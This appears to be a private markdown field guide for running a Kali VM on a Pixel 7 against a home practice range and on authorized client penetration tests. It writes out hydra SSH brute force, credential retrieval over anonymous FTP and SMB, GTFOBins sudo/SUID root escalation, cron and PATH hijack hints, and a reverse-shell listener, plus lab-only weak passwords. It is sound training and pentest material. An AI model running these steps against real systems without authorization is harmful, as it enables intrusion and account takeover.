# Field Guide — Pixel 7 + KaliDroid

How to run the Pixel 7 (KaliDroid) against the **practice range** and against **real authorized client engagements**.
Private. Lab-only weak credentials appear below — isolated practice network only, never reuse anywhere real.

---

## 0. Environment (already set up)

**Pixel 7 (GrapheneOS)** — Tailscale app signed in as `Archangel356291`, tagged `tag:attacker` (range-only, never expires). The phone does **not** need `--accept-routes` (Android Tailscale uses the subnet route automatically).

**KaliDroid** — a real QEMU Kali VM (not proot): 4 GB RAM / 4 vCPU / 16 GB disk, **OpenRC** init (not systemd — a `systemctl` shim prints harmless `SyntaxWarning` lines, ignore them), zsh, terminal auto-logs in as root. Tools already installed (`kali-tools-top10`: nmap, metasploit, sqlmap, john, hydra, netexec, responder, bloodhound.py, certipy + nikto, gobuster, whatweb, theharvester). SSH on **port 9922** (LAN-exposure off). Phone Downloads is shared into the VM at **`/mnt/downloads`**. Metasploit DB (`msfdb`) and the TryHackMe OpenVPN auto-start at boot — THM's `tun0` and the lab range coexist fine.

> ### ⚠️ KaliDroid networking reality — READ THIS
> The VM sits behind **QEMU user-mode NAT** (VM IP `10.0.2.15`, gateway `10.0.2.2`). Outbound TCP/UDP works and rides the phone's Tailscale, but **raw ICMP `ping`, ARP sweeps, and SYN (`-sS`) / UDP scans do NOT traverse QEMU NAT.**
> - Use **`nmap -sT -Pn`** (TCP connect, no ping) — *never* `-sS`, `-sU`, or ping-based discovery from the VM.
> - Test reachability with a TCP check, not ping: `nc -vz 10.9.9.20 80`.
> - Reverse shells to the phone need an app port-forward and usually fail — **catch them on CT102 `kali` or the laptop** instead.

**Laptop (gelus) — already done** (`sudo tailscale set --accept-routes=true`); it reaches the range natively, so from the laptop `ping`/`-sS` work normally.

**Verify the phone can see the range** (from KaliDroid, after `range up` on viking) — use a TCP check, ping won't work here:
```bash
nc -vz 10.9.9.20 80        # DVWA — "open" = you're in
nc -vz 10.9.9.30 21        # misa FTP
```
No connection → open the Tailscale app, confirm it's Connected, and make sure the range is up (below).

---

## 1. Turn the range on / off / reset

From the phone or laptop (SSH to viking):
```bash
ssh root@192.168.0.50 range up       # start all targets (do this before practicing)
ssh root@192.168.0.50 range status   # list targets, state, difficulty level
ssh root@192.168.0.50 range reset    # wipe everything back to clean vulnerable baseline
ssh root@192.168.0.50 range down     # stop targets, free RAM when done
```
Difficulty dials (make it harder as you improve):
```bash
ssh root@192.168.0.50 "pct exec 103 -- labctl intermediate"       # DVWA box
ssh root@192.168.0.50 "pct exec 106 -- labctl-misa advanced"      # services box
# levels: beginner easy intermediate advanced expert
```

---

## 2. Practice targets — what's on each box

| IP | Box | What to practice |
|----|-----|------------------|
| 10.9.9.20 | DVWA (CT103) | Web app attacks (SQLi, XSS, command inj, upload) + Linux privesc |
| 10.9.9.21 | SQLi shop (CT105) | SQL injection → dump users → crack hashes + Linux privesc |
| 10.9.9.30 | misa (CT106) | Network-service recon/exploitation (FTP/SMB/SNMP/telnet) + Linux privesc |

### Recon first (always)
From **KaliDroid** (behind QEMU NAT) use TCP-connect scans only:
```bash
nmap -sT -Pn -sV 10.9.9.30                 # TCP connect + version (no ping, no SYN)
nmap -sT -Pn -p- 10.9.9.30                 # full TCP port sweep
# SNMP/UDP won't scan through QEMU NAT — just query it directly:
snmpwalk -v2c -c public 10.9.9.30 | head
```
From the **laptop** (native routing) the normal fast scans work: `nmap -sV -sC -p- 10.9.9.30`, `nmap -sU --top-ports 25 10.9.9.30`.

### misa (10.9.9.30) walkthrough
```bash
# Anonymous FTP — read the finding
ftp 10.9.9.30        # login: anonymous / (any) → get notes.txt   (reveals svc-backup / Spring2021!)
# SMB guest share
smbclient -N -L //10.9.9.30/                 # list shares
smbclient -N //10.9.9.30/public -c 'get creds.txt'   # → administrator / P@ssw0rd-Winter23
# SNMP public community
snmpwalk -v2c -c public 10.9.9.30 | head
# Weak SSH password (brute or just log in)
hydra -l bob -P /usr/share/wordlists/rockyou.txt ssh://10.9.9.30   # finds password123
ssh bob@10.9.9.30                                   # bob / password123
# Legacy banner for version/CVE recon practice
nc 10.9.9.30 2121                                   # "ProFTPD 1.3.3c" — look it up
```

### Linux privesc (after you land as bob / lowpriv)
Foothold user: `bob` on misa; `lowpriv / lowpriv123` on CT103/CT105. Try, in order:
```bash
sudo -l                                   # misa: bob can run find as root (NOPASSWD)
sudo find . -exec /bin/sh \; -quit        # → root (GTFOBins)
find / -perm -4000 2>/dev/null            # spot the planted SUID (find-suid / cp-suid)
/usr/local/bin/find-suid . -exec /bin/sh -p \; -quit
cat /etc/cron.d/*                          # root cron runs a world-writable script → overwrite it
ls -la /opt/range/                         # readable creds in *.conf and ~/.bash_history
echo PATH hijack: writable /usr/local/sbin is on a root cron's PATH — drop a malicious binary there
```
Full answer key: `homelab/range/ANSWERS.md`.

### Reset between attempts
`ssh root@192.168.0.50 range reset` — restores every box to clean vulnerable state in seconds.

---

## 3. Real client field work (AUTHORIZED engagements only)

### 3.1 Before you touch anything — the gate
- **Signed authorization in hand** naming the exact scope (IPs/domains/hours). No signature = no testing. This is the line between pentest and crime.
- Confirm the **scope boundaries** in writing: which hosts/subnets are in, which are explicitly out, allowed test windows, and who to call if something breaks.
- Keep the authorization on the phone (PDF) for the whole engagement.

### 3.2 Find the client's IP / subnet
- **On their network (Wi-Fi/ethernet):** `ip a` then `ip route` → your subnet is the `/24` on your interface (e.g. `192.168.1.0/24`). Gateway = the router.
- **Their public range (external test):** `nslookup their-domain.com`, then `whois <ip>` for the netblock/CIDR they own. Only test the ranges the authorization lists.
- **Confirm scope before scanning:** `nmap -sn 192.168.1.0/24` (host discovery, no port probing) to map live hosts, then compare against the authorized list.

### 3.3 Engagement workflow (phone)
```bash
mkdir -p ~/engagements/<client>/<date> && cd $_    # one folder per job, keep everything
nmap -sV -sC -oA scan 203.0.113.0/28               # -oA = save all formats for the report
nikto -h http://<target>                            # web server checks
# enumerate only what's in scope; note findings as you go
```
- Work **methodically**: recon → enumerate → validate a finding → document → (only if authorized) exploit.
- **Rate-limit** on production: `nmap -T2`, avoid aggressive brute force unless the scope allows it.
- **Screenshot/log every finding** with the command that produced it — that's your report evidence.

### 3.4 Catching reverse shells in the field
The Pixel is behind mobile-carrier NAT, so targets usually **can't** connect back to it directly. Options:
- **Laptop (gelus) as the catcher** when it's on the same client network: `nc -lvnp 4444` and point the payload at the laptop's LAN IP.
- **Your home kali box (CT102)** over Tailscale only works if the target can route to your tailnet — usually it can't from a client site. On-site, use the laptop.
- Bind shells (target listens, you connect) sidestep the NAT problem when the target is directly reachable.

### 3.5 Wrap-up (every engagement)
- **Clean up**: remove any uploaded tools, shells, test accounts, and files you created on client systems.
- **Report**: executive summary + each finding (severity, evidence, reproduction, remediation). Pull the `-oA` scans and screenshots from your engagement folder.
- **Hand off securely**; delete client data from the phone afterward unless the contract says to retain it.

---

## 4. Quick reference

| Need | Command |
|------|---------|
| Start range | `ssh root@192.168.0.50 range up` |
| Reset range | `ssh root@192.168.0.50 range reset` |
| Stop range (free RAM) | `ssh root@192.168.0.50 range down` |
| Full scan | `nmap -sV -sC -p- <ip>` |
| UDP/SNMP | `nmap -sU --top-ports 25 <ip>` |
| SMB shares | `smbclient -N -L //<ip>/` |
| SSH brute | `hydra -l <user> -P rockyou.txt ssh://<ip>` |
| SUID hunt | `find / -perm -4000 2>/dev/null` |
| Sudo check | `sudo -l` |

**Golden rules:** range IPs are `10.9.9.x` (isolated, safe to hammer, reset anytime). Real clients only with signed authorization and in scope. From **KaliDroid** use `nmap -sT -Pn` only (QEMU NAT blocks ping/SYN/UDP); from the **laptop** normal scans work. Phone can't catch reverse shells behind NAT — use the laptop or CT102 on-site.
